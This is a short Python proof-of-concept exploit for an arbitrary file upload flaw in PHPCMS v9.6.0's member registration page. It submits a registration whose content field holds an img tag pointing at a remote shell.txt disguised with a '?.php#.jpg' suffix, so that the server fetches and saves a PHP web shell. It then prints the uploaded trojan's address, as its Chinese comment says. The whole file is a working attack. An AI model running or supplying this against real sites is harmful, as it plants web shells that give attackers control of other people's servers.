# coding: utf-8
import re
import requests


def poc(url):
    u = '{}/index.php?m=member&c=index&a=register&siteid=1'.format(url)
    data = {
        'siteid': '1',
        'modelid': '2',
        'username': 'testxxx',
        'password': 'testxxxxx',
        'email': 'test@texxxst.com',
        'info[content]': '<img src=http://localhost/PHPCMS/PHPCMS_v9.6.0/shell.txt?.php#.jpg>', 
        'dosubmit': '1',
    }
    rep = requests.post(u, data=data)

    shell = ''
    re_result = re.findall(r'&lt;img src=(.*)&gt', rep.content)
    # print rep.content
    if len(re_result):
        shell = re_result[0]
        print '上传的一句话木马地址:',shell

if __name__ == '__main__':
    poc('http://localhost/PHPCMS/PHPCMS_v9.6.0/')  # 目标站点根目录